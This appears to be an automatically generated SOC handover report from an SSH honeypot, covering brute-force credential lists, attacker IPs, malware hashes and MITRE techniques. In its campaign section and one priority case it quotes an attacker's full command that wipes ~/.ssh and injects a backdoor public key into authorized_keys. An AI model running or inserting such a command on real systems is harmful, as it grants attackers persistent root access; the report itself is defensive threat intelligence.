# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-24 |
| **Generated At** | 2026-03-24T10:51:27Z |
| **Shift Time** | 10:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **152** |
| Confirmed Threats | **53** |
| False Positives Filtered | **99** (65.1%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **12** |
| High Severity Cases | **91** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **61** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **105** |
| Unique Credential Pairs | **105** |
| Unique Usernames | **14** |
| Unique Passwords | **104** |
| Successful Auth Pairs | **91** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 91 |
| `Blank` | 2 |
| `Supervisor` | 1 |
| `unknown` | 1 |
| `mysql` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `qwerty12` | 2 |
| `changeme` | 1 |
| `Pa$$w0rd` | 1 |
| `shredstream` | 1 |
| `321321` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `changeme` | 1 |
| `root` | `Pa$$w0rd` | 1 |
| `root` | `shredstream` | 1 |
| `root` | `321321` | 1 |
| `root` | `Huawei@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `changeme` | `64.236.176.194` | 2026-03-24T08:52:08 |
| `root` | `Pa$$w0rd` | `64.236.176.194` | 2026-03-24T08:53:29 |
| `root` | `shredstream` | `64.236.176.194` | 2026-03-24T08:54:52 |
| `root` | `321321` | `103.61.122.229` | 2026-03-24T08:55:30 |
| `root` | `Huawei@123` | `64.236.176.194` | 2026-03-24T08:56:13 |
| `root` | `Kevin2008` | `103.61.122.229` | 2026-03-24T08:57:11 |
| `root` | `1q2w3e` | `64.236.176.194` | 2026-03-24T08:57:35 |
| `root` | `epicfail` | `103.61.122.229` | 2026-03-24T08:58:47 |
| `root` | `solana123` | `64.236.176.194` | 2026-03-24T08:58:56 |
| `root` | `ftpuser123` | `64.236.176.194` | 2026-03-24T09:00:17 |
| `root` | `Sweety@143` | `103.61.122.229` | 2026-03-24T09:00:27 |
| `root` | `hadoop123` | `64.236.176.194` | 2026-03-24T09:01:37 |
| `root` | `vyos` | `64.236.176.194` | 2026-03-24T09:03:00 |
| `root` | `root12` | `64.236.176.194` | 2026-03-24T09:04:26 |
| `root` | `!QAZ2wsx` | `64.236.176.194` | 2026-03-24T09:05:50 |
| `root` | `test1234` | `64.236.176.194` | 2026-03-24T09:07:13 |
| `root` | `j` | `64.236.176.194` | 2026-03-24T09:08:37 |
| `root` | `test2` | `64.236.176.194` | 2026-03-24T09:10:02 |
| `root` | `r00t` | `64.236.176.194` | 2026-03-24T09:11:27 |
| `root` | `abc` | `64.236.176.194` | 2026-03-24T09:12:49 |
| `root` | `11` | `64.236.176.194` | 2026-03-24T09:14:08 |
| `root` | `soporte` | `64.236.176.194` | 2026-03-24T09:15:29 |
| `root` | `ark` | `64.236.176.194` | 2026-03-24T09:16:51 |
| `root` | `docker123` | `64.236.176.194` | 2026-03-24T09:18:15 |
| `root` | `!Q2w3e4r` | `64.236.176.194` | 2026-03-24T09:19:38 |
| `root` | `k` | `64.236.176.194` | 2026-03-24T09:21:02 |
| `root` | `admin1234` | `64.236.176.194` | 2026-03-24T09:22:26 |
| `root` | `temp` | `64.236.176.194` | 2026-03-24T09:23:56 |
| `root` | `deploy123` | `64.236.176.194` | 2026-03-24T09:25:18 |
| `root` | `pi` | `64.236.176.194` | 2026-03-24T09:26:40 |
| `root` | `claude` | `64.236.176.194` | 2026-03-24T09:28:01 |
| `root` | `1qaz@wsx` | `64.236.176.194` | 2026-03-24T09:29:22 |
| `root` | `developer` | `64.236.176.194` | 2026-03-24T09:30:45 |
| `root` | `minecraft` | `64.236.176.194` | 2026-03-24T09:32:07 |
| `root` | `www123` | `64.236.176.194` | 2026-03-24T09:33:29 |
| `root` | `Bingo@1993` | `64.236.176.194` | 2026-03-24T09:34:56 |
| `root` | `1qaz@WSX3edc` | `64.236.176.194` | 2026-03-24T09:36:22 |
| `root` | `localhost` | `64.236.176.194` | 2026-03-24T09:37:47 |
| `root` | `mellon` | `64.236.176.194` | 2026-03-24T09:39:13 |
| `root` | `Changeme_123` | `64.236.176.194` | 2026-03-24T09:40:38 |
| `root` | `cds-china` | `103.164.9.74` | 2026-03-24T09:40:51 |
| `root` | `3245gs5662d34` | `103.164.9.74` | 2026-03-24T09:40:53 |
| `root` | `home` | `64.236.176.194` | 2026-03-24T09:42:04 |
| `root` | `@qwer2025` | `64.236.176.194` | 2026-03-24T09:43:27 |
| `root` | `!qaz@WSX` | `64.236.176.194` | 2026-03-24T09:44:49 |
| `root` | `test@123` | `64.236.176.194` | 2026-03-24T09:46:10 |
| `root` | `11111111` | `64.236.176.194` | 2026-03-24T09:47:33 |
| `root` | `user123` | `64.236.176.194` | 2026-03-24T09:48:58 |
| `root` | ` ` | `64.236.176.194` | 2026-03-24T09:50:23 |
| `root` | `1234abcd` | `64.236.176.194` | 2026-03-24T09:51:46 |
| `root` | `data` | `64.236.176.194` | 2026-03-24T09:53:10 |
| `root` | `tomcat` | `64.236.176.194` | 2026-03-24T09:54:36 |
| `root` | `git123` | `64.236.176.194` | 2026-03-24T09:56:02 |
| `root` | `plex` | `64.236.176.194` | 2026-03-24T09:57:27 |
| `root` | `claude123` | `64.236.176.194` | 2026-03-24T09:58:49 |
| `root` | `nvidia` | `64.236.176.194` | 2026-03-24T10:00:13 |
| `root` | `pool` | `64.236.176.194` | 2026-03-24T10:01:35 |
| `root` | `Qq123456` | `64.236.176.194` | 2026-03-24T10:02:57 |
| `root` | `host` | `64.236.176.194` | 2026-03-24T10:04:20 |
| `root` | `mc` | `64.236.176.194` | 2026-03-24T10:05:45 |
| `root` | `aa` | `64.236.176.194` | 2026-03-24T10:07:10 |
| `root` | `mysql123` | `64.236.176.194` | 2026-03-24T10:08:37 |
| `root` | `esuser` | `64.236.176.194` | 2026-03-24T10:10:03 |
| `root` | `solana@123` | `64.236.176.194` | 2026-03-24T10:11:29 |
| `root` | `!Q@W3e4r` | `64.236.176.194` | 2026-03-24T10:12:54 |
| `root` | `guest123` | `64.236.176.194` | 2026-03-24T10:14:17 |
| `root` | `nexus` | `64.236.176.194` | 2026-03-24T10:15:39 |
| `root` | `milad` | `64.236.176.194` | 2026-03-24T10:17:01 |
| `root` | `LeitboGi0ro` | `64.236.176.194` | 2026-03-24T10:18:24 |
| `root` | `uniswap` | `64.236.176.194` | 2026-03-24T10:19:48 |
| `root` | `curved` | `64.236.176.194` | 2026-03-24T10:21:15 |
| `root` | `qQ123456` | `64.236.176.194` | 2026-03-24T10:22:41 |
| `root` | `frappe` | `64.236.176.194` | 2026-03-24T10:24:07 |
| `root` | `Admin` | `64.236.176.194` | 2026-03-24T10:25:35 |
| `root` | `es` | `64.236.176.194` | 2026-03-24T10:27:01 |
| `root` | `Aa123456@` | `64.236.176.194` | 2026-03-24T10:28:26 |
| `root` | `p@ssword` | `64.236.176.194` | 2026-03-24T10:29:49 |
| `root` | `3edc#EDC` | `64.236.176.194` | 2026-03-24T10:31:11 |
| `root` | `root12345` | `64.236.176.194` | 2026-03-24T10:32:34 |
| `root` | `admin123456` | `64.236.176.194` | 2026-03-24T10:33:59 |
| `root` | `backup` | `64.236.176.194` | 2026-03-24T10:35:24 |
| `root` | `555555` | `64.236.176.194` | 2026-03-24T10:36:51 |
| `root` | `ansible` | `64.236.176.194` | 2026-03-24T10:38:17 |
| `root` | `latitude` | `64.236.176.194` | 2026-03-24T10:39:45 |
| `root` | `blockchain` | `64.236.176.194` | 2026-03-24T10:41:08 |
| `root` | `super` | `64.236.176.194` | 2026-03-24T10:42:33 |
| `root` | `hive` | `64.236.176.194` | 2026-03-24T10:43:58 |
| `root` | `hooman` | `64.236.176.194` | 2026-03-24T10:45:21 |
| `root` | `admin2026` | `64.236.176.194` | 2026-03-24T10:46:46 |
| `root` | `bot123` | `64.236.176.194` | 2026-03-24T10:48:10 |
| `root` | `ftp123` | `64.236.176.194` | 2026-03-24T10:49:31 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **16** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.164.9.74`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **19** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS4788` | TM TECHNOLOGY SERVICES SDN. BHD. | 1 | LOW |
| `AS18881` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | LOW |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS9930` | TTNET-MY | 1 | HIGH |
| `AS6128` | Cablevision Systems Corp. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-57b571263d46

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-03-24 08:55 |
| **Last Seen** | 2026-03-24 08:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 08:55:24` | `cowrie.session.connect` |
| `2026-03-24 08:55:24` | `cowrie.client.version` |
| `2026-03-24 08:55:29` | `cowrie.client.kex` |
| `2026-03-24 08:55:30` | `cowrie.login.success` |
| `2026-03-24 08:55:31` | `cowrie.session.params` |
| `2026-03-24 08:55:31` | `cowrie.command.input` |
| `2026-03-24 08:55:31` | `cowrie.log.closed` |
| `2026-03-24 08:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c299ccf474

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-03-24 08:57 |
| **Last Seen** | 2026-03-24 08:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 08:57:05` | `cowrie.session.connect` |
| `2026-03-24 08:57:05` | `cowrie.client.version` |
| `2026-03-24 08:57:08` | `cowrie.client.kex` |
| `2026-03-24 08:57:11` | `cowrie.login.success` |
| `2026-03-24 08:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc2ff28fa5e

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-03-24 08:58 |
| **Last Seen** | 2026-03-24 08:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 08:58:45` | `cowrie.session.connect` |
| `2026-03-24 08:58:45` | `cowrie.client.version` |
| `2026-03-24 08:58:46` | `cowrie.client.kex` |
| `2026-03-24 08:58:47` | `cowrie.login.success` |
| `2026-03-24 08:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213384179d64

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-03-24 09:00 |
| **Last Seen** | 2026-03-24 09:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 09:00:25` | `cowrie.session.connect` |
| `2026-03-24 09:00:25` | `cowrie.client.version` |
| `2026-03-24 09:00:25` | `cowrie.client.kex` |
| `2026-03-24 09:00:27` | `cowrie.login.success` |
| `2026-03-24 09:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd6d44d7696

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-03-24 09:40 |
| **Last Seen** | 2026-03-24 09:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 09:40:51` | `cowrie.session.connect` |
| `2026-03-24 09:40:51` | `cowrie.client.version` |
| `2026-03-24 09:40:51` | `cowrie.client.kex` |
| `2026-03-24 09:40:51` | `cowrie.login.success` |
| `2026-03-24 09:40:52` | `cowrie.session.params` |
| `2026-03-24 09:40:52` | `cowrie.command.input` |
| `2026-03-24 09:40:52` | `cowrie.command.failed` |
| `2026-03-24 09:40:52` | `cowrie.log.closed` |
| `2026-03-24 09:40:52` | `cowrie.session.params` |
| `2026-03-24 09:40:52` | `cowrie.command.input` |
| `2026-03-24 09:40:52` | `cowrie.session.file_download` |
| `2026-03-24 09:40:52` | `cowrie.log.closed` |
| `2026-03-24 09:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233757a5d347

| Field | Detail |
|---|---|
| **Source IP** | `103.164.9[.]74` |
| **First Seen** | 2026-03-24 09:40 |
| **Last Seen** | 2026-03-24 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 09:40:53` | `cowrie.session.connect` |
| `2026-03-24 09:40:53` | `cowrie.client.version` |
| `2026-03-24 09:40:53` | `cowrie.client.kex` |
| `2026-03-24 09:40:53` | `cowrie.login.success` |
| `2026-03-24 09:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.164.9[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.164.9[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.97.104[.]10` | **34** | 2026-03-24 08:51 | 2026-03-24 10:24 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `103.164.9[.]74` | **4** | 2026-03-24 09:35 | 2026-03-24 09:43 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-03-24 09:26 | 2026-03-24 09:26 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]72` | 1 | 2026-03-24 09:44 | 2026-03-24 09:44 | 3s | 0 | `T1592` | 🟢 LOW |
| `119.6.55[.]57` | 1 | 2026-03-24 10:43 | 2026-03-24 10:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `161.142.238[.]29` | 1 | 2026-03-24 10:12 | 2026-03-24 10:12 | 34s | 0 | `T1592` | 🟢 LOW |
| `179.185.227[.]77` | 1 | 2026-03-24 10:02 | 2026-03-24 10:03 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.61[.]139` | 1 | 2026-03-24 10:22 | 2026-03-24 10:23 | 42s | 0 | `T1592` | 🟢 LOW |
| `185.153.95[.]187` | 1 | 2026-03-24 10:14 | 2026-03-24 10:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.24.141[.]156` | 1 | 2026-03-24 09:57 | 2026-03-24 09:58 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.167[.]78` | 1 | 2026-03-24 09:18 | 2026-03-24 09:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.246.89[.]70` | KR | LG DACOM Corporation | **100** ⚠️ | 33 |
| `65.20.167[.]78` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 26 |
| `103.164.9[.]74` | PK | KHAZANA ENTERPRISE (PRIVATE) LIMITED | **100** ⚠️ | 16 |
| `27.24.141[.]156` | CN | CHINANET Hubei province network | **100** ⚠️ | 3 |
| `106.246.89[.]72` | KR | LG DACOM Corporation | **100** ⚠️ | 24 |
| `119.6.55[.]57` | CN | China Unicom SiChuan province network | **100** ⚠️ | 50 |
| `179.185.227[.]77` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 30 |
| `185.153.95[.]187` | RU | LLC NEW NETWORK | **100** ⚠️ | 12 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `161.142.238[.]29` | MY | TT DOTCOM SDN BHD | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 105 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 91 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 9 |

---

## 🔕 False Positive Summary (99 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 85 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 152 cases |
| Tool 34  | Credential Extractor        | ✅ 105 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 16 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 99 filtered (65.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 11 recon entry/entries in table (2 group(s) consolidating 38 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-24T10:51:27Z_
